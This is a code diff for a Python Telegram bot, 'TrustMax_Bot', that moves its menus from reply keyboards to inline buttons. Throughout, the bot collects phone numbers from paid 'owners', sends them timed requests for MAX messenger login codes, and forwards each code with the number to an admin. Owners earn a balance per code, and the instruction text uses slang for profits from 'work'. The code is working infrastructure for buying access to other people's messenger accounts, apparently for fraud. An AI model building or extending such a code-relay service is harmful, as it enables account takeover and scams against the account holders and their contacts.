@@ -25,6 +25,7 @@ from aiogram.types import (
     KeyboardButton,
     Message,
     ReplyKeyboardMarkup,
+    ReplyKeyboardRemove,
 )
 from dotenv import load_dotenv
 
@@ -79,73 +80,82 @@ def can_be_owner(uid: int | None) -> bool:
     return not OWNER_WHITELIST or uid in OWNER_WHITELIST
 
 
-# ─── Кнопки ────────────────────────────────────────────────────────────────
+# ─── Инлайн-клавиатуры ──────────────────────────────────────────────────────
 
-BTN_OWNERS   = "📋 Владельцы"
-BTN_REQUEST  = "🔐 Запросить код"
-BTN_CANCEL   = "❌ Отменить"
-BTN_REGISTER = "Сдать номер📱"
-BTN_PROFILE  = "👤 Профиль"
-BTN_DECLINE  = "🚫 Отказаться"
-BTN_MENU     = "🏠 Меню"
-BTN_SETTINGS = "⚙️ Настройки"
-BTN_SET_PRICE = "💰 Прайс"
-BTN_SET_WORK  = "🔄 Ворк"
-BTN_SET_MSG   = "📢 Сообщение"
-BTN_BACK      = "◀️ Назад"
-
-MENU_BUTTONS = {
-    BTN_OWNERS, BTN_REQUEST, BTN_CANCEL, BTN_REGISTER, BTN_PROFILE,
-    BTN_DECLINE, BTN_MENU, BTN_SETTINGS, BTN_SET_PRICE, BTN_SET_WORK,
-    BTN_SET_MSG, BTN_BACK,
-}
-
-# ─── Клавиатуры ────────────────────────────────────────────────────────────
-
-def main_menu_keyboard(uid: int) -> ReplyKeyboardMarkup:
-    rows: list[list[KeyboardButton]] = []
-    if is_admin(uid):
-        rows.append([KeyboardButton(text=BTN_OWNERS), KeyboardButton(text=BTN_REQUEST)])
-        if store.active or store.queue:
-            rows.append([KeyboardButton(text=BTN_CANCEL)])
-        rows.append([KeyboardButton(text=BTN_SETTINGS)])
-    elif can_be_owner(uid):
-        rows.append([KeyboardButton(text=BTN_REGISTER), KeyboardButton(text=BTN_PROFILE)])
-        if store.get_pending(uid):
-            rows.append([KeyboardButton(text=BTN_DECLINE)])
-    rows.append([KeyboardButton(text=BTN_MENU)])
-    return ReplyKeyboardMarkup(keyboard=rows, resize_keyboard=True)
-
-
-def settings_keyboard() -> ReplyKeyboardMarkup:
-    return ReplyKeyboardMarkup(
-        keyboard=[
-            [KeyboardButton(text=BTN_SET_PRICE), KeyboardButton(text=BTN_SET_WORK)],
-            [KeyboardButton(text=BTN_SET_MSG)],
-            [KeyboardButton(text=BTN_BACK)],
+def owner_menu_inline() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="👤 Профиль",       callback_data="menu:profile"),
+            InlineKeyboardButton(text="📱 Сдать номер",   callback_data="menu:register"),
         ],
-        resize_keyboard=True,
-    )
-
-
-def contact_keyboard() -> ReplyKeyboardMarkup:
-    return ReplyKeyboardMarkup(
-        keyboard=[
-            [KeyboardButton(text="📱 Отправить номер", request_contact=True)],
-            [KeyboardButton(text=BTN_MENU)],
+        [
+            InlineKeyboardButton(text="⏳ Очередь",       callback_data="menu:queue"),
+            InlineKeyboardButton(text="📊 Статистика",    callback_data="menu:stats"),
         ],
-        resize_keyboard=True,
-        one_time_keyboard=True,
-    )
+        [
+            InlineKeyboardButton(text="💸 Вывод средств", callback_data="menu:withdraw"),
+        ],
+        [
+            InlineKeyboardButton(text="📖 Инструкция",    callback_data="show:instruction"),
+            InlineKeyboardButton(text="🛠 Тех. поддержка", url="https://t.me/Don1_Tomas1"),
+        ],
+    ])
+
+
+def admin_menu_inline() -> InlineKeyboardMarkup:
+    rows: list[list[InlineKeyboardButton]] = [
+        [
+            InlineKeyboardButton(text="📋 Владельцы",     callback_data="menu:owners"),
+            InlineKeyboardButton(text="🔐 Запросить код", callback_data="menu:request"),
+        ],
+        [
+            InlineKeyboardButton(text="⚙️ Настройки",     callback_data="menu:settings"),
+        ],
+    ]
+    if store.active or store.queue:
+        rows.append([InlineKeyboardButton(text="❌ Отменить", callback_data="menu:cancel")])
+    rows.append([
+        InlineKeyboardButton(text="📖 Инструкция",    callback_data="show:instruction"),
+        InlineKeyboardButton(text="🛠 Тех. поддержка", url="https://t.me/Don1_Tomas1"),
+    ])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+
+def settings_inline() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="💰 Прайс",    callback_data="settings:price"),
+            InlineKeyboardButton(text="🔄 Ворк",     callback_data="settings:work"),
+        ],
+        [
+            InlineKeyboardButton(text="📢 Сообщение", callback_data="settings:msg"),
+        ],
+        [
+            InlineKeyboardButton(text="◀️ Назад",    callback_data="menu:back"),
+        ],
+    ])
 
 
 def work_inline() -> InlineKeyboardMarkup:
     on  = "✅ " if store.bot_status.lower() in ("включён", "включен", "on", "вкл") else ""
     off = "" if on else "✅ "
-    return InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text=f"{on}Включен",   callback_data="work:on"),
-        InlineKeyboardButton(text=f"{off}Выключен", callback_data="work:off"),
-    ]])
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text=f"{on}Включен",    callback_data="work:on"),
+            InlineKeyboardButton(text=f"{off}Выключен",  callback_data="work:off"),
+        ],
+        [InlineKeyboardButton(text="◀️ Назад", callback_data="settings:back")],
+    ])
+
+
+def contact_keyboard() -> ReplyKeyboardMarkup:
+    """Используется только для запроса контакта при регистрации номера."""
+    return ReplyKeyboardMarkup(
+        keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
+        resize_keyboard=True,
+        one_time_keyboard=True,
+    )
+
 
 # ─── Форматирование ─────────────────────────────────────────────────────────
 
@@ -256,12 +266,8 @@ def format_profile_text(user_id: int) -> str:
         f"└ Ожидают код: *{in_active}*",
     ])
 
-# ─── Отправка меню ──────────────────────────────────────────────────────────
 
-_WELCOME_KB = InlineKeyboardMarkup(inline_keyboard=[[
-    InlineKeyboardButton(text="📖 Инструкция", callback_data="show:instruction"),
-    InlineKeyboardButton(text="🛠 Тех. поддержка", url="https://t.me/Don1_Tomas1"),
-]])
+# ─── Инструкция ─────────────────────────────────────────────────────────────
 
 _INSTRUCTION_TEXT = """🎓 *ГЛАВНАЯ ИНСТРУКЦИЯ TrustMax\\_Bot*
 
@@ -290,13 +296,22 @@ _INSTRUCTION_TEXT = """🎓 *ГЛАВНАЯ ИНСТРУКЦИЯ TrustMax\\_Bot*
 Удачи и больше профитов\\! 🍀"""
 
 
+# ─── Отправка меню ──────────────────────────────────────────────────────────
+
 async def _send_welcome(message: Message, uid: int, *, first_time: bool = False) -> None:
-    kb = main_menu_keyboard(uid)
+    # Убираем старую reply-клавиатуру, если она осталась
+    try:
+        rm = await message.answer(".", reply_markup=ReplyKeyboardRemove())
+        await rm.delete()
+    except Exception:
+        pass
+    kb = admin_menu_inline() if is_admin(uid) else owner_menu_inline()
     if first_time and LOGO_FILE:
         await message.answer_photo(photo=LOGO_FILE, caption=welcome_text(),
                                    parse_mode="MarkdownV2", reply_markup=kb)
     else:
         await message.answer(welcome_text(), parse_mode="MarkdownV2", reply_markup=kb)
+
 
 # ─── Команды ────────────────────────────────────────────────────────────────
 
@@ -316,11 +331,6 @@ async def cmd_start(message: Message, state: FSMContext) -> None:
 
     if is_admin(uid) or can_be_owner(uid):
         await _send_welcome(message, uid, first_time=first_time)
-        if can_be_owner(uid) and not is_admin(uid) and uid in store.owners:
-            o = store.owners[uid]
-            phones = "\n".join(f"  • {mask_phone(p)}" for p in o.phones)
-            await message.answer(f"Ваши номера ({len(o.phones)}):\n{phones}",
-                                 reply_markup=main_menu_keyboard(uid))
         return
     await message.answer(
         "Бот для передачи кода входа в MAX.\n"
@@ -334,14 +344,14 @@ async def cmd_profile(message: Message, command: CommandObject) -> None:
     if is_admin(uid):
         if command.args and command.args.strip().isdigit():
             await message.answer(format_profile_text(int(command.args.strip())),
-                                 parse_mode="Markdown", reply_markup=main_menu_keyboard(uid))
+                                 parse_mode="Markdown")
             return
         await message.answer(
             "Профиль: `/profile 123456789`\nБаланс: `/addbal 123456789 100`",
-            parse_mode="Markdown", reply_markup=main_menu_keyboard(uid))
+            parse_mode="Markdown")
         return
     await message.answer(format_profile_text(uid), parse_mode="Markdown",
-                         reply_markup=main_menu_keyboard(uid))
+                         reply_markup=owner_menu_inline())
 
 
 @router.message(Command("addbal"))
@@ -359,8 +369,7 @@ async def cmd_addbal(message: Message, command: CommandObject) -> None:
         await message.answer("Некорректная сумма.")
         return
     bal = store.add_balance(int(parts[0]), amount)
-    await message.answer(f"Баланс `{parts[0]}`: **{bal:.2f}$**",
-                         parse_mode="Markdown", reply_markup=main_menu_keyboard(message.from_user.id))
+    await message.answer(f"Баланс `{parts[0]}`: **{bal:.2f}$**", parse_mode="Markdown")
 
 
 @router.message(Command("setstatus"))
@@ -374,8 +383,7 @@ async def cmd_setstatus(message: Message, command: CommandObject) -> None:
         return
     store.bot_status = value
     store.save()
-    await message.answer(welcome_text(), parse_mode="MarkdownV2",
-                         reply_markup=main_menu_keyboard(message.from_user.id))
+    await message.answer(welcome_text(), parse_mode="MarkdownV2", reply_markup=admin_menu_inline())
 
 
 @router.message(Command("setprice"))
@@ -389,15 +397,14 @@ async def cmd_setprice(message: Message, command: CommandObject) -> None:
         return
     store.price = value
     store.save()
-    await message.answer(welcome_text(), parse_mode="MarkdownV2",
-                         reply_markup=main_menu_keyboard(message.from_user.id))
+    await message.answer(welcome_text(), parse_mode="MarkdownV2", reply_markup=admin_menu_inline())
 
 
 @router.message(Command("register"))
 async def cmd_register(message: Message, state: FSMContext) -> None:
     uid = message.from_user.id if message.from_user else 0
     if is_admin(uid):
-        await message.answer("Администратору недоступно.", reply_markup=main_menu_keyboard(uid))
+        await message.answer("Администратору недоступно.")
         return
     if not can_be_owner(uid):
         await message.answer("Регистрация отключена для вашего аккаунта.")
@@ -439,21 +446,26 @@ async def _finish_register(message: Message, state: FSMContext, phone: str) -> N
         return
     existing = store.owner_by_phone(phone)
     if existing and existing.user_id != user.id:
-        await message.answer("Этот номер уже зарегистрирован. Обратитесь к администратору.",
-                             reply_markup=main_menu_keyboard(user.id))
         await state.clear()
+        await message.answer("Этот номер уже зарегистрирован. Обратитесь к администратору.",
+                             reply_markup=ReplyKeyboardRemove())
+        await message.answer(welcome_text(), parse_mode="MarkdownV2", reply_markup=owner_menu_inline())
         return
     owner, already = store.register_owner(user.id, phone, name=user.full_name, username=user.username)
     await state.clear()
     if already:
-        await message.answer(f"Номер {mask_phone(phone)} уже в вашем списке ({len(owner.phones)} всего).",
-                             reply_markup=main_menu_keyboard(user.id))
+        await message.answer(
+            f"Номер {mask_phone(phone)} уже в вашем списке ({len(owner.phones)} всего).",
+            reply_markup=ReplyKeyboardRemove(),
+        )
+        await message.answer(welcome_text(), parse_mode="MarkdownV2", reply_markup=owner_menu_inline())
         return
     await message.answer(
         f"Номер {mask_phone(phone)} сохранён. Всего: {len(owner.phones)}.\n"
         "Когда нужен код — получите уведомление.",
-        reply_markup=main_menu_keyboard(user.id),
+        reply_markup=ReplyKeyboardRemove(),
     )
+    await message.answer(welcome_text(), parse_mode="MarkdownV2", reply_markup=owner_menu_inline())
     for admin_id in ADMIN_IDS:
         try:
             await message.bot.send_message(
@@ -472,10 +484,11 @@ async def cmd_owners(message: Message) -> None:
         await message.answer("Команда только для администратора.")
         return
     if not store.owners:
-        await message.answer("Владельцев нет.", reply_markup=main_menu_keyboard(uid))
+        await message.answer("Владельцев нет.", reply_markup=admin_menu_inline())
         return
     await message.answer(format_owners_list(), parse_mode="Markdown",
                          reply_markup=owners_request_inline())
+
 
 # ─── Таймер и очередь ───────────────────────────────────────────────────────
 
@@ -508,9 +521,8 @@ async def _notify_owner_request(bot: Bot, req: CodeRequest) -> bool:
             req.owner_id,
             f"🔐 **Запрос кода MAX**\n\nНомер: `{req.phone}`\n"
             f"⏱ У вас **{CODE_TIMEOUT_SEC} сек** чтобы прислать **{CODE_LEN} цифр**.\n"
-            "Отказ: 🚫 Отказаться",
+            "Просто отправьте код ответным сообщением.",
             parse_mode="Markdown",
-            reply_markup=main_menu_keyboard(req.owner_id),
         )
         return True
     except Exception:
@@ -542,7 +554,7 @@ async def _process_next_in_queue(bot: Bot, admin_id: int) -> None:
         if not nxt:
             try:
                 await bot.send_message(admin_id, "✅ Очередь обработана.",
-                                       reply_markup=main_menu_keyboard(admin_id))
+                                       reply_markup=admin_menu_inline())
             except Exception:
                 pass
             return
@@ -556,7 +568,7 @@ async def _process_next_in_queue(bot: Bot, admin_id: int) -> None:
 
 async def _queue_all_phones(bot: Bot, admin_id: int, reply_to: Message) -> None:
     if not store.owners:
-        await reply_to.answer("Владельцев нет.", reply_markup=main_menu_keyboard(admin_id))
+        await reply_to.answer("Владельцев нет.", reply_markup=admin_menu_inline())
         return
 
     added = already = 0
@@ -573,14 +585,14 @@ async def _queue_all_phones(bot: Bot, admin_id: int, reply_to: Message) -> None:
             added += 1
 
     if added == 0:
-        await reply_to.answer("Все номера уже в очереди.", reply_markup=main_menu_keyboard(admin_id))
+        await reply_to.answer("Все номера уже в очереди.", reply_markup=admin_menu_inline())
         return
 
     note = f" · {already} уже в очереди" if already else ""
     await reply_to.answer(
         f"📥 Запущено: *{added}* номеров{note}. В очереди: *{store.queue_size()}*",
         parse_mode="Markdown",
-        reply_markup=main_menu_keyboard(admin_id),
+        reply_markup=admin_menu_inline(),
     )
 
 
@@ -600,7 +612,7 @@ async def _finish_active(bot: Bot, *, reason: str, code: str | None = None,
         note = f"\n💰 +{CODE_REWARD:.0f}$ · баланс **{profile.balance:.2f}$**" if CODE_REWARD > 0 else ""
         if message:
             await message.answer(f"Код передан. Спасибо!{note}", parse_mode="Markdown",
-                                 reply_markup=main_menu_keyboard(req.owner_id))
+                                 reply_markup=owner_menu_inline())
         try:
             await bot.send_message(admin_id,
                                    f"✅ **Код**\nВладелец: {owner_name}\nНомер: `{req.phone}`\nКод: `{code}`",
@@ -611,8 +623,7 @@ async def _finish_active(bot: Bot, *, reason: str, code: str | None = None,
     elif reason == "timeout":
         store.record_code_fail(req.owner_id)
         try:
-            await bot.send_message(req.owner_id, "⏱ Время вышло. Код не получен.",
-                                   reply_markup=main_menu_keyboard(req.owner_id))
+            await bot.send_message(req.owner_id, "⏱ Время вышло. Код не получен.")
         except Exception:
             pass
         try:
@@ -624,7 +635,7 @@ async def _finish_active(bot: Bot, *, reason: str, code: str | None = None,
     elif reason == "decline":
         store.record_code_fail(req.owner_id)
         if message:
-            await message.answer("Вы отказались.", reply_markup=main_menu_keyboard(req.owner_id))
+            await message.answer("Вы отказались.", reply_markup=owner_menu_inline())
         try:
             await bot.send_message(admin_id, f"🚫 Отказ для `{req.phone}`.", parse_mode="Markdown")
         except Exception:
@@ -632,8 +643,7 @@ async def _finish_active(bot: Bot, *, reason: str, code: str | None = None,
 
     elif reason == "cancel":
         try:
-            await bot.send_message(req.owner_id, "Запрос отменён администратором.",
-                                   reply_markup=main_menu_keyboard(req.owner_id))
+            await bot.send_message(req.owner_id, "Запрос отменён администратором.")
         except Exception:
             pass
 
@@ -645,19 +655,19 @@ async def _do_request(bot: Bot, admin_id: int, phone: str, reply_to: Message | N
     if not owner:
         if reply_to:
             await reply_to.answer(f"Номер {phone} не зарегистрирован.",
-                                  reply_markup=main_menu_keyboard(admin_id))
+                                  reply_markup=admin_menu_inline())
         return False
 
     status = store.phone_status(phone)
     if status == "active":
         if reply_to:
             await reply_to.answer(f"{mask_phone(phone)} уже обрабатывается ({store.seconds_left()} сек).",
-                                  reply_markup=main_menu_keyboard(admin_id))
+                                  reply_markup=admin_menu_inline())
         return False
     if status == "queued":
         if reply_to:
             await reply_to.answer(f"{mask_phone(phone)} в очереди (позиция {store.queue_position(phone)}).",
-                                  reply_markup=main_menu_keyboard(admin_id))
+                                  reply_markup=admin_menu_inline())
         return False
 
     req = CodeRequest(owner_id=owner.user_id, admin_id=admin_id, phone=phone)
@@ -665,17 +675,17 @@ async def _do_request(bot: Bot, admin_id: int, phone: str, reply_to: Message | N
         if not await _activate_request(bot, req):
             if reply_to:
                 await reply_to.answer("Не удалось связаться с владельцем.",
-                                      reply_markup=main_menu_keyboard(admin_id))
+                                      reply_markup=admin_menu_inline())
             return False
         if reply_to:
             await reply_to.answer(f"Запрос для {mask_phone(phone)} активен.",
-                                  reply_markup=main_menu_keyboard(admin_id))
+                                  reply_markup=admin_menu_inline())
         return True
 
     pos = store.push_queue(req)
     text = f"📥 {mask_phone(phone)} в очереди (позиция {pos})."
     if reply_to:
-        await reply_to.answer(text, reply_markup=main_menu_keyboard(admin_id))
+        await reply_to.answer(text, reply_markup=admin_menu_inline())
     else:
         try:
             await bot.send_message(admin_id, text)
@@ -683,12 +693,120 @@ async def _do_request(bot: Bot, admin_id: int, phone: str, reply_to: Message | N
             pass
     return True
 
+
 # ─── Callbacks ──────────────────────────────────────────────────────────────
 
 @router.callback_query(F.data == "show:instruction")
 async def cb_instruction(callback: CallbackQuery) -> None:
     await callback.answer()
     await callback.message.answer(_INSTRUCTION_TEXT, parse_mode="MarkdownV2")
+
+
+@router.callback_query(F.data.startswith("menu:"))
+async def cb_menu(callback: CallbackQuery, state: FSMContext, bot: Bot) -> None:
+    await callback.answer()
+    uid = callback.from_user.id if callback.from_user else 0
+    action = (callback.data or "").removeprefix("menu:")
+    msg = callback.message
+
+    if action == "back":
+        await _send_welcome(msg, uid)
+
+    elif action == "profile":
+        await msg.answer(format_profile_text(uid), parse_mode="Markdown",
+                         reply_markup=owner_menu_inline())
+
+    elif action == "register":
+        if not can_be_owner(uid) or is_admin(uid):
+            await callback.answer("Недоступно", show_alert=True)
+            return
+        await state.set_state(OwnerRegister.waiting_phone)
+        await msg.answer(
+            f"Отправьте номер MAX:\n• кнопкой ниже, или\n• текстом: {PHONE_HINT}",
+            reply_markup=contact_keyboard(),
+        )
+
+    elif action == "queue":
+        in_queue  = sum(1 for r in store.queue if r.owner_id == uid)
+        in_active = 1 if store.active and store.active.owner_id == uid else 0
+        owner = store.owners.get(uid)
+        phones = owner.phones if owner else []
+        await msg.answer(
+            f"⏳ *Ваша очередь*\n\n"
+            f"Номеров зарегистрировано: *{len(phones)}*\n"
+            f"В очереди: *{in_queue}*\n"
+            f"В обработке: *{in_active}*",
+            parse_mode="Markdown",
+            reply_markup=owner_menu_inline(),
+        )
+
+    elif action == "stats":
+        await msg.answer(format_profile_text(uid), parse_mode="Markdown",
+                         reply_markup=owner_menu_inline())
+
+    elif action == "withdraw":
+        profile = store.get_profile(uid)
+        await msg.answer(
+            f"💸 *Вывод средств*\n\n"
+            f"Ваш баланс: *{profile.balance:.2f}$*\n\n"
+            f"Минимальная сумма вывода: *1$*\n"
+            f"Для вывода обратитесь в тех\\. поддержку: @Don1\\_Tomas1",
+            parse_mode="MarkdownV2",
+            reply_markup=owner_menu_inline(),
+        )
+
+    elif action == "owners" and is_admin(uid):
+        if not store.owners:
+            await msg.answer("Владельцев нет.", reply_markup=admin_menu_inline())
+        else:
+            await msg.answer(format_owners_list(), parse_mode="Markdown",
+                             reply_markup=owners_request_inline())
+
+    elif action == "request" and is_admin(uid):
+        await _queue_all_phones(bot, uid, msg)
+
+    elif action == "cancel" and is_admin(uid):
+        await _cancel_timer()
+        cancelled, was_active = store.cancel_all_for_admin(uid)
+        if was_active:
+            try:
+                await bot.send_message(was_active.owner_id, "Запрос кода отменён.")
+            except Exception:
+                pass
+        await msg.answer(
+            f"Отменено: {cancelled}." if cancelled else "Очередь пуста.",
+            reply_markup=admin_menu_inline(),
+        )
+
+    elif action == "settings" and is_admin(uid):
+        await _show_settings(msg)
+
+    else:
+        await callback.answer("Команда недоступна", show_alert=True)
+
+
+@router.callback_query(F.data.startswith("settings:"))
+async def cb_settings(callback: CallbackQuery, state: FSMContext) -> None:
+    await callback.answer()
+    uid = callback.from_user.id if callback.from_user else 0
+    if not is_admin(uid):
+        return
+    action = (callback.data or "").removeprefix("settings:")
+    msg = callback.message
+
+    if action == "price":
+        await state.set_state(AdminSettings.waiting_price)
+        await msg.answer("Введите новый текст прайса:", reply_markup=settings_inline())
+
+    elif action == "work":
+        await msg.answer("Выберите статус:", reply_markup=work_inline())
+
+    elif action == "msg":
+        await state.set_state(AdminSettings.waiting_broadcast)
+        await msg.answer("Введите сообщение для рассылки:", reply_markup=settings_inline())
+
+    elif action == "back":
+        await _show_settings(msg)
 
 
 @router.callback_query(F.data.startswith("req:"))
@@ -706,8 +824,29 @@ async def cb_request_code(callback: CallbackQuery, bot: Bot) -> None:
     await callback.answer("Запрос отправлен")
     if callback.message:
         await callback.message.answer(f"Запрос для {mask_phone(phone)} отправлен.",
-                                      reply_markup=main_menu_keyboard(callback.from_user.id))
+                                      reply_markup=admin_menu_inline())
 
+
+@router.callback_query(F.data.startswith("work:"))
+async def cb_work_toggle(callback: CallbackQuery) -> None:
+    if not callback.from_user or not is_admin(callback.from_user.id):
+        await callback.answer("Только для администратора", show_alert=True)
+        return
+    value = (callback.data or "").removeprefix("work:")
+    store.bot_status = "включён" if value == "on" else "выключен"
+    store.save()
+    icon = "✅" if value == "on" else "🔴"
+    await callback.answer(f"Статус: {store.bot_status}")
+    if callback.message:
+        try:
+            await callback.message.edit_reply_markup(reply_markup=work_inline())
+        except Exception:
+            pass
+        await callback.message.answer(f"Статус: {icon} {store.bot_status}",
+                                      reply_markup=settings_inline())
+
+
+# ─── Команды (для удобства остаются) ────────────────────────────────────────
 
 @router.message(Command("request"))
 async def cmd_request(message: Message, command: CommandObject, bot: Bot) -> None:
@@ -734,20 +873,19 @@ async def cmd_cancel(message: Message, state: FSMContext) -> None:
         cancelled, was_active = store.cancel_all_for_admin(uid or 0)
         if was_active:
             try:
-                await message.bot.send_message(was_active.owner_id, "Запрос кода отменён.",
-                                               reply_markup=main_menu_keyboard(was_active.owner_id))
+                await message.bot.send_message(was_active.owner_id, "Запрос кода отменён.")
             except Exception:
                 pass
         await message.answer(
             f"Отменено: {cancelled}." if cancelled else "Очередь пуста.",
-            reply_markup=main_menu_keyboard(uid or 0),
+            reply_markup=admin_menu_inline(),
         )
         if store.active is None and store.queue:
             await _process_next_in_queue(message.bot, uid or 0)
         return
     req = store.get_pending(uid or 0)
     if not req:
-        await message.answer("Нет активного запроса.", reply_markup=main_menu_keyboard(uid or 0))
+        await message.answer("Нет активного запроса.", reply_markup=owner_menu_inline())
         return
     await _finish_active(message.bot, reason="decline", message=message)
 
@@ -756,7 +894,7 @@ async def cmd_cancel(message: Message, state: FSMContext) -> None:
 async def cmd_decline(message: Message, bot: Bot) -> None:
     uid = message.from_user.id if message.from_user else 0
     if not store.get_pending(uid):
-        await message.answer("Нет активного запроса.", reply_markup=main_menu_keyboard(uid))
+        await message.answer("Нет активного запроса.", reply_markup=owner_menu_inline())
         return
     await _finish_active(bot, reason="decline", message=message)
 
@@ -776,17 +914,18 @@ async def cmd_code(message: Message, command: CommandObject, bot: Bot) -> None:
         return
     await _finish_active(bot, reason="code", code=code, message=message)
 
+
 # ─── Настройки ──────────────────────────────────────────────────────────────
 
 async def _show_settings(message: Message) -> None:
     icon = "✅" if store.bot_status.lower() in ("включён", "включен", "on", "вкл") else "🔴"
     await message.answer(
         f"⚙️ Настройки\n\nСтатус: {icon} {store.bot_status}\nПрайс: {store.price}",
-        reply_markup=settings_keyboard(),
+        reply_markup=settings_inline(),
     )
 
 
-@router.message(AdminSettings.waiting_price, F.text, ~F.text.in_(MENU_BUTTONS))
+@router.message(AdminSettings.waiting_price, F.text)
 async def settings_price_input(message: Message, state: FSMContext) -> None:
     store.price = message.text or ""
     store.save()
@@ -796,7 +935,7 @@ async def settings_price_input(message: Message, state: FSMContext) -> None:
     await _show_settings(message)
 
 
-@router.message(AdminSettings.waiting_broadcast, F.text, ~F.text.in_(MENU_BUTTONS))
+@router.message(AdminSettings.waiting_broadcast, F.text)
 async def settings_broadcast_input(message: Message, state: FSMContext, bot: Bot) -> None:
     text = message.text or ""
     sender_id = message.from_user.id if message.from_user else 0
@@ -808,79 +947,31 @@ async def settings_broadcast_input(message: Message, state: FSMContext, bot: Bot
         except Exception:
             fail += 1
     await state.clear()
-    await message.answer(f"Рассылка: {ok} доставлено, {fail} ошибок.", reply_markup=settings_keyboard())
+    await message.answer(f"Рассылка: {ok} доставлено, {fail} ошибок.", reply_markup=settings_inline())
 
 
-@router.callback_query(F.data.startswith("work:"))
-async def cb_work_toggle(callback: CallbackQuery) -> None:
-    if not callback.from_user or not is_admin(callback.from_user.id):
-        await callback.answer("Только для администратора", show_alert=True)
-        return
-    value = (callback.data or "").removeprefix("work:")
-    store.bot_status = "включён" if value == "on" else "выключен"
-    store.save()
-    icon = "✅" if value == "on" else "🔴"
-    await callback.answer(f"Статус: {store.bot_status}")
-    if callback.message:
-        try:
-            await callback.message.edit_reply_markup(reply_markup=work_inline())
-        except Exception:
-            pass
-        await callback.message.answer(f"Статус: {icon} {store.bot_status}",
-                                      reply_markup=settings_keyboard())
-
-# ─── Обработчик кнопок меню ─────────────────────────────────────────────────
-
-@router.message(F.text.in_(MENU_BUTTONS))
-async def on_menu_button(message: Message, state: FSMContext, bot: Bot) -> None:
-    await state.clear()
-    uid = message.from_user.id if message.from_user else 0
-    text = message.text or ""
-
-    if text in (BTN_MENU, BTN_BACK):
-        await cmd_start(message, state)
-    elif text == BTN_SETTINGS and is_admin(uid):
-        await _show_settings(message)
-    elif text == BTN_SET_PRICE and is_admin(uid):
-        await state.set_state(AdminSettings.waiting_price)
-        await message.answer("Введите новый текст прайса:", reply_markup=settings_keyboard())
-    elif text == BTN_SET_WORK and is_admin(uid):
-        await message.answer("Выберите статус:", reply_markup=work_inline())
-    elif text == BTN_SET_MSG and is_admin(uid):
-        await state.set_state(AdminSettings.waiting_broadcast)
-        await message.answer("Введите сообщение для рассылки:", reply_markup=settings_keyboard())
-    elif text == BTN_OWNERS and is_admin(uid):
-        await cmd_owners(message)
-    elif text == BTN_REQUEST and is_admin(uid):
-        await _queue_all_phones(bot, uid, message)
-    elif text == BTN_CANCEL:
-        await cmd_cancel(message, state)
-    elif text == BTN_REGISTER and can_be_owner(uid) and not is_admin(uid):
-        await cmd_register(message, state)
-    elif text == BTN_PROFILE and not is_admin(uid):
-        await message.answer(format_profile_text(uid), parse_mode="Markdown",
-                             reply_markup=main_menu_keyboard(uid))
-    elif text == BTN_DECLINE:
-        await cmd_decline(message, bot)
-    else:
-        await message.answer("Команда недоступна.", reply_markup=main_menu_keyboard(uid))
-
+# ─── Обработчик текста ──────────────────────────────────────────────────────
 
 @router.message(F.text)
 async def on_text(message: Message, bot: Bot, state: FSMContext) -> None:
     if await state.get_state():
         return
     uid = message.from_user.id if message.from_user else 0
+
+    # Ввод кода владельцем в ответ на запрос
     req = store.get_pending(uid)
-    if not req or not message.text:
-        if is_admin(uid) or can_be_owner(uid):
-            await message.answer("Используйте кнопки меню 👇", reply_markup=main_menu_keyboard(uid))
+    if req and message.text:
+        code = parse_code(message.text)
+        if not code:
+            await message.answer(f"Код — {CODE_LEN} цифр (например 123456). Отказ: /decline")
+            return
+        await _finish_active(bot, reason="code", code=code, message=message)
         return
-    code = parse_code(message.text)
-    if not code:
-        await message.answer(f"Код — {CODE_LEN} цифр (например 123456). Отказ: 🚫 Отказаться")
-        return
-    await _finish_active(bot, reason="code", code=code, message=message)
+
+    # Для остальных — показываем меню
+    if is_admin(uid) or can_be_owner(uid):
+        await _send_welcome(message, uid)
+
 
 # ─── Запуск ─────────────────────────────────────────────────────────────────
 
